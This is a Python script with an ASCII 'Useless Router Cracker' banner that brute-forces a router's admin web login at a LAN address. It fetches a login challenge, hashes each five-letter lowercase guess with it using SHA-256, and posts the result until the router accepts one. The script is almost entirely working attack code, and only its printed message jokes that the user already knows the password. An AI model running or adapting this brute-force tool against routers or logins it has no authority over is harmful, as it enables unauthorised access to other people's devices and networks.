import time, datetime
import requests
import json
import hashlib
import itertools, sys
import os
import cursor
from termcolor import colored
cursor.hide()
def now_milliseconds():
   return int(time.time() * 1000)

csrf_token = "HK784ABC12JW6D8810EB"

def char_range(c1, c2):
    """Generates the characters from `c1` to `c2`, inclusive."""
    for c in range(ord(c1), ord(c2)+1):
        yield chr(c)
def convert(s): 
  
    # initialization of string to "" 
    new = "" 
  
    # traverse in the string  
    for x in s: 
        new += x  
  
    # return string  
    return new 


def get_challenge():
    req="?_="+str(now_milliseconds())+"&csrf_token="+csrf_token
    response = requests.get("http://192.168.0.254/data/login.json"+req)
    json_data = response.json()
    return json_data[0]['challenge']
spinner = itertools.cycle(['-', '/', '|', '\\'])
def crack():
    pas = ['a','a','a','a','a'] 
    for a in char_range('a', 'z'):
        pas[0]=a;1
        for b in char_range('a', 'z'):
            pas[1]=b;
            for c in char_range('a', 'z'):
                pas[2]=c;
                for d in char_range('a', 'z'):
                    pas[3]=d;
                    for f in char_range('a', 'z'):
                        pas[4]=f;
                        cracked_password=convert(pas)+get_challenge()
                        hash_res = hashlib.sha256(cracked_password.encode('utf-8')).hexdigest()
                        params = {'LoginName': 'admin', 'LoginPWD': hash_res}
                        response= requests.post("http://192.168.0.254/data/login.json?_="+str(now_milliseconds())+"&csrf_token=HK784ABC12JW6D8810E", data=params)
                        print (convert(pas))
                        if response.text =="1":
                            print()
                            print ("Match found! ")
                            print("The password is... "+colored(convert(pas), "red"))
                            return convert(pas)
                        sys.stdout.write(next(spinner))  # write the next character
                        sys.stdout.flush()                # flush stdout buffer (actual character display)
                        sys.stdout.write('\b')            # erase the last written char
    return
os.system('cls' if os.name == 'nt' else 'clear')
print (colored(" _   _          _               ______            _            _____                _             ", "green"))
print (colored("| | | |        | |              | ___ \          | |          /  __ \              | |            ", "green"))
print (colored("| | | |___  ___| | ___  ___ ___ | |_/ /___  _   _| |_ ___ _ __| /  \/_ __ __ _  ___| | _____ _ __ ", "green"))
print (colored("| | | / __|/ _ \ |/ _ \/ __/ __||    // _ \| | | | __/ _ \ '__| |   | '__/ _` |/ __| |/ / _ \ '__|", "green"))
print (colored("| |_| \__ \  __/ |  __/\__ \__ \| |\ \ (_) | |_| | ||  __/ |  | \__/\ | | (_| | (__|   <  __/ |   ", "green"))
print (colored(" \___/|___/\___|_|\___||___/___/\_| \_\___/ \__,_|\__\___|_|   \____/_|  \__,_|\___|_|\_\___|_|   ", "green"))



print()
print()

print("Cracking your router's password (that you already know...)   ", end='')

crack()

cursor.show()
